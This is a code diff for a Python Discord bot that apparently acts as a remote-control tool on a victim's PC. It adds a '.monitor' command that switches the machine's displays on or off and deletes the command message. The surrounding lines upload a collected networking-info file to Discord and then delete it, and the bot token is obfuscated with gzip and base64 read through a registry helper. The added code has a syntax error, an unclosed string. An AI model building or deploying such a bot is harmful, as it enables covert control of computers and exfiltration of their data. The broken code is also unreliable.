@@ -423,4 +423,19 @@ async def on_message(message):
         await message.channel.send(file=discord.File("networking_info.txt"))
         os.remove("networking_info.txt")
 
+    #MONITORS
+    if message.content.startswith(".monitor):
+        arg = message.content.split(" ")[1]
+        await message.delete()
+        try:
+            if arg == "off":
+                pc.off_mon()
+            elif arg == "on":
+                pc.on_mon()
+            embed = discord.Embed(title="Monitor Control", description="Monitor state changed.", color=0x00ff00)
+        except Exception as e:
+            print(e)
+            embed = discord.Embed(title="Monitor Control", description="Failed to channge monitor state.", color=0x00ff00)
+        await message.channel.send(embed=embed)
+
 client.run(gzip.decompress(base64.b64decode(reg_h.get_token())).decode("utf-8"))
